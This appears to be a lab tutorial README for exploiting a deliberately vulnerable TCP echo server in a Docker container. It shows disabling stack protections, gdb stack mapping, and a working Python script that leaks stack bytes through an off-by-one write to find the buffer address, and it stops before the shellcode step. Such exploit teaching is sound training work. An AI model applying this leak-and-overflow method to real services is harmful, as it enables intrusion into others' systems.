# tcp-echo-server

Simple TCP echo server with buffer overflow vulnerability (original source [here](https://github.com/polyverse/tcp-echo-server))

A minor change was made to the original to make the code easier to work with:

```sh
$ diff main.c.orig main.c
38a39,44
>       int enable = 1;
>       if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable)) < 0) {
>               fprintf(stderr, "Error on setsockopt(). Exiting...\n");
>               exit(EXIT_FAILURE);
>       }
> 
```

## tcp-echo-server-1

For the first exploit iteration, disable stack smashing protection (-fnostack-protector) and allow instruction execution on the stack (-zexecstack).

Build the Docker container image with: `cd tcp-echo-server-1; docker build -t tcp-echo-server:latest .`

(Remove old images by adding `&& docker images -f dangling=true -q | xargs -r docker rmi`)

Launch an interactive shell within the container with: `docker run -it --rm -p 8080:8080 --entrypoint /bin/bash tcp-echo-server:latest`

The read() in the vuln_read() is vulnerable to a buffer overflow; can read as many as 1000 bytes into an 80 byte stack-backed buffer.

```c
#define BUFFER_SIZE 1000

void vuln_read(int client_fd)
{
        char buffer[80] = {0};  // initialize array with zeroes

        int n = read(client_fd, buffer, BUFFER_SIZE);
        printf("read: %d bytes\n", n);
  
        // echo input back to client
        write(client_fd, buffer, n + 1); // include null
}
```

Since stack smashing protection is disabled and stack instruction execution is allowed, the simpliest exploit is to arrange for buffer to contain shellcode and to overwrite the vuln_read() return address on the stack to return to that shellcode.

Gather some runtime info by launching the application with gdb:

```sh
[root@<containerid> polyverse]# gdb tcp-echo-server
<startup messages elided>
gdb-peda$ break vuln_read
Breakpoint 1 at 0xa50: file main.c, line 13.
gdb-peda$ run
Starting program: /opt/polyverse/tcp-echo-server
```

Connect to the server (say with netcat) and send some text to trigger the breakpoint.

```sh
<registers, code, stack dump elided>
Breakpoint 1, vuln_read (client_fd=0x8) at main.c:13
13              char buffer[80] = {0};  // initialize array with zeroes
Missing separate debuginfos, use: debuginfo-install glibc-2.17-292.el7.x86_64
gdb-peda$ print &buffer
$0 = (char (*)[80]) 0x7fff5dc15ce0
gdb-peda$ print &n
$1 = (int *) 0x7fff5dc15d3c
gdb-peda$ print $rbp
$2 = (void *) 0x7fff5dc15d40
gdb-peda$ x/1xg $rbp
0x7fff5dc15d40: 0x00007fff5dc15db0
gdb-peda$ x/1xg $rbp+8
0x7fff5dc15d48: 0x0000558fbe231c5c
gdb-peda$ list *(*(long int *)($rbp+8)) # or just list *0x0000558fbe231c5c
0x558fbe231c5c is in main (main.c:66).
61                      if (client_fd < 0)
62                      fprintf(stderr, "Error on accept().\n");
63
64                      vuln_read(client_fd);
65
66                      close(client_fd);
67              }
68
69              close(server_fd);
70
```

With this the layout of the stack can be determined:

![stack](stack.png)

This information indicates the amount of space available for shellcode and the offset from the start of buffer to the frame return address.  The only piece of information needed is the actual address at the start of the buffer.

Refer back to vuln_read():

```c
        int n = read(client_fd, buffer, BUFFER_SIZE);
        printf("read: %d bytes\n", n);
  
        // echo input back to client
        write(client_fd, buffer, n + 1); // include null
```

Notice that n bytes are read from the socket but n + 1 bytes are written.  The comment is incorrect, the read() and write() functions do not insert extra null bytes.  This can be used to read values from stack after buffer:

```python
#!/usr/bin/env python3

import socket

host, port = '127.0.0.1', 8080

outbuf = b'a' * 80

for i in range(32):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    assert sock.send(outbuf) == len(outbuf)
    inbuf = sock.recv(1024)
    assert len(inbuf) == len(outbuf) + 1

    print('%02x' % inbuf[-1], end=' ', flush=True)
    outbuf += bytes([inbuf[-1]])

print()
```

Above outbuf gets bytes appended from the stack so that the stack is unmodified by this operation.

RBP is a fixed offset from the end of buffer which can be calculated from the stack layout determined earlier, here 16 bytes.  Similarly now the value of RBP is available and with it the address of buffer, here 208 byte offset.

```python
# code snippet above elided

import struct

# assuming a little endian system, change the format for big endian
rbp_value = struct.unpack('<Q', outbuf[80+16:80+24])[0]
buffer_addr = rbp_value - 208
```

Next is to write the shellcode and overwrite the frame return address to point to it.




